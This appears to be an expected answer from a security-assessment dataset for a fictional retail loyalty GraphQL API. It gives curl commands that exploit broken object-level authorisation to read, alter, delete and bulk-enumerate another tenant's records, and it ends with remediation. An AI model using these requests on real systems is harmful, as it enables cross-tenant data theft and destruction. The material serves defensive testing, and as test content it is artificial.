# Expected Response

## System
- System: RewardCore Loyalty API v4.5.7
- Domain: RETAIL / LOYALTY PROGRAMME
- Example ID: GQL-0423
- Risk ID: RISK-GQL-423

## Findings

### 1. Pattern 1.6 — Write Operations Without Ownership Check: `updateResource` (Primary Pattern)

Section 5.0 states: "The `updateResource` mutation accepts an arbitrary `resourceId` in the path without verifying the requester owns that object. A write-level BOLA allows state corruption across tenants." An attacker can update or delete another tenant's loyalty programme records (point balances, reward tiers, redemption history) without any ownership validation.

```bash
# Cross-tenant loyalty record update (Pattern 1.6 core — write without ownership check)
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "mutation { updateResource(id: \"R-2423\", input: {status: \"expired\", ownerId: \"attacker-df1fec06\"}) { resourceId tenantId status ownerId } }"}'
```
**Vulnerable outcome:** Victim tenant's loyalty points or reward record modified — points expired, tier downgraded, ownerId hijacked.

### 2. Cross-Tenant Loyalty Record Read — `getResource` (HAR Primary)

HAR capture shows `getResource(id: "R-2423")` from `tenant-df1f` returning data for `tenant-ec06` — read BOLA confirmed (RISK-GQL-423).

```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "query { getResource(id: \"R-2423\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-ec06"` with `sensitiveField: "CONFIDENTIAL-df1fec06"` and `internalNotes`.

### 3. Cross-Tenant Loyalty Record Delete — `deleteResource`

```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "mutation { deleteResource(id: \"R-2423\") }"}'
```
**Vulnerable outcome:** Competitor's loyalty programme record permanently deleted — irreversible loss of customer points history.

### 4. Bulk Cross-Tenant Loyalty Enumeration — `bulkResourceLookup`

`bulkResourceLookup` is documented in Section 4.0 as accepting arbitrary IDs without per-ID ownership filtering.

```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2423\", \"R-3423\", \"R-4423\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```

### 5. Redis Cache Loyalty Data Leak

Cache key is `resourceId` only. Loyalty record data (point balances, PII) for one tenant can be served from cache to another tenant.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "query { getResource(id: \"R-1423\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-df1f"`.

**Step 2 — Cross-tenant read (primary HAR attack):**
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "query { getResource(id: \"R-2423\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenantId: "tenant-ec06"` — BOLA confirmed.

**Step 3 — Write without ownership check: expire victim's loyalty points (Pattern 1.6 primary):**
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-DF1F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-df1f" \
  -d '{"query": "mutation { updateResource(id: \"R-2423\", input: {status: \"expired\", ownerId: \"attacker-df1fec06\"}) { resourceId tenantId status } }"}'
```
**Vulnerable:** Victim's loyalty record state corrupted — points expired, ownership hijacked.

## Secure Outcome Verification
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource`, `updateResource`, `deleteResource` (RISK-GQL-423).
- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter returning only `tenantId === jwtTenantId` items.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
- Automated regression test: Tenant A token requests Tenant B resource — assert 403 or null data.
